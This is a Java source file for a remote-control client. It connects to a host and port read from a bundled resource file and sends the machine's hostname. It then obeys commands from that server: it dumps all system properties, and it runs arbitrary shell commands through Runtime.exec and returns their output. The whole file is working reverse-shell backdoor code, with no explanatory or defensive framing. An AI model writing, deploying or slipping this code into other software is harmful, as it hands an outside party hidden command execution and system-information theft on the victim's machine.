import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Properties;

public class Main {
    public static void main(String[] args) {
        try {
            InputStream inputStream = Main.class.getResource("resource/server.txt").openStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));

            String host = bufferedReader.readLine();
            int port = Integer.parseInt(bufferedReader.readLine());

            Socket socket = new Socket(host,port);
            OutputStream outputStream = socket.getOutputStream();
            InputStream in_socket = socket.getInputStream();
            PrintWriter printWriter = new PrintWriter(outputStream);
            BufferedReader get_buf = new BufferedReader(new InputStreamReader(in_socket));


            printWriter.println(" [Connect] "+ InetAddress.getLocalHost ().getHostName ());
            printWriter.flush();

            while (true) {
                String message = get_buf.readLine();
                if (message == null) {
                    break;
                }
                System.out.println(message);

                if (message.equals("none")) {
                    printWriter.println();
                    printWriter.flush();
                    continue;
                }
                if (message.equals("getinfo")) {
                    Properties properties = System.getProperties();
                    StringBuilder stringBuilder = new StringBuilder("");
                    stringBuilder.append("/n/n");

                    for (String properties_key : properties.stringPropertyNames())
                    {
                        stringBuilder.append(" --- ");
                        stringBuilder.append(properties_key);
                        stringBuilder.append(": ");
                        stringBuilder.append(properties.getProperty(properties_key));
                        stringBuilder.append("/n");
                    }
                    stringBuilder.append("");
                    printWriter.println(stringBuilder.toString());
                    printWriter.flush();
                    continue;
                }
                if (message.startsWith("shell:")) {
                    try {
                        String command = message.substring(6);
                        //System.out.print(command);
                        Runtime runtime = Runtime.getRuntime();
                        Process process = runtime.exec(command.split(" "));
                        InputStream in = process.getInputStream();

                        BufferedReader buf_shell = new BufferedReader(new InputStreamReader(in));
                        StringBuilder stringBuilder = new StringBuilder("");
                        while (true) {
                            String line = buf_shell.readLine();
                            if (line == null) {
                                break;
                            }
                            stringBuilder.append(line);
                            stringBuilder.append("/n");
                        }
                        buf_shell.close();
                        in.close();
                        //process.destroy();

                        System.out.println(stringBuilder.toString());
                        printWriter.println(stringBuilder.toString());
                        printWriter.flush();
                        continue;
                    }
                    catch (Exception exception){
                        printWriter.println("run command error");
                        printWriter.flush();
                    }
                }
                if (message.equals("exit")) {
                    System.exit(0);
                }
                else {
                    printWriter.println("send command error");
                    printWriter.flush();
                }
            }
            socket.close();
        }
        catch (Exception exception) {
            System.exit(0);
        }
    }
}
